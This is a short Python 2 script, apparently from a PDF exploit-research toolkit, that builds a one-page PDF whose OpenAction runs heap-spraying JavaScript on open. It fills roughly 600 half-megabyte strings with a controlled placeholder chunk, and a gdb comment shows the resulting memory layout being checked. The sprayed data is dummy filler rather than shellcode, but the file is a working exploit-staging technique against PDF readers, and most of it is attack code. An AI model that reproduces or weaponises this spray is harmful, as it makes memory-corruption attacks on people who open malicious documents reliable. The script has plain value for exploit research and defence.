##########################################################################
####      Felipe Andres Manzano * felipa.andres.manzano@gmail.com     ####
##########################################################################
## Add a heap spraying javascript to the document as OpenAction putting 
## the js is in a potentialy 'filtered' Stream.
from miniPDF import *

#Auxiliar to generate the unescape JS thingy
def _toJS(s):
    if type(s) in set([long, int]) :
        s = struct.pack("<L",s) 
    assert len(s) % 2 == 0
    return "unescape('%s')"%("".join(["%u"+"".join([ "%02x%02x"%(ord(s[i*2+1]),ord(s[i*2]))]) for i in range (0,len(s)/2)]))
    
#The document
doc = PDFDoc()

#no-contents
contents=  PDFStream(''' ''')

#page
page = PDFDict()
page.add("Type",PDFName("Page"))
page.add("Contents", PDFRef(contents))

#pages
pages = PDFDict()
pages.add("Type", PDFName("Pages"))
pages.add("Kids", PDFArray([PDFRef(page)]))
pages.add("Count", PDFNum(1))

#catalog
catalog = PDFDict()
catalog.add("Type", PDFName("Catalog"))
catalog.add("Pages", PDFRef(pages))

#The spraying js
js = '''
var slide_size=0x100000;
var size = 600;      
var x = new Array(size);
var chunk = %%minichunk%%;

while (chunk.length <= slide_size/2) 
            chunk += chunk;

for (i=0; i < size; i+=1) {
        id = ""+i;
        x[i]= chunk.substring(4,slide_size/2-id.length-20)+id;
} 
            
'''
#And we put in the controled minichunk
# The will be something like "<<<<AAAAAAAAAAAA...AAAAAAAAAAAAAAAAA>>>>"
# With total length = 0x1000
js = js.replace('%%minichunk%%', _toJS('<<<<'+'A'*(0x1000-8)+'>>>>'))

#Add OpenAction javascript to the Document
jsStream = PDFStream(js)
doc.add(jsStream)

#set the OpenAction of the document
actionJS = PDFDict()
actionJS.add("S", PDFName("JavaScript"))
actionJS.add("JS",PDFRef(jsStream))
doc.add(actionJS)
catalog.add("OpenAction", PDFRef(actionJS))

#add the rest of the objects to the doc
doc.add([catalog,pages,page,contents])
#the catalog is the root object
doc.setRoot(catalog)

#renter it to stdout
print doc

#(gdb) x/20x 0xb0000000+0x1000*x +3*4
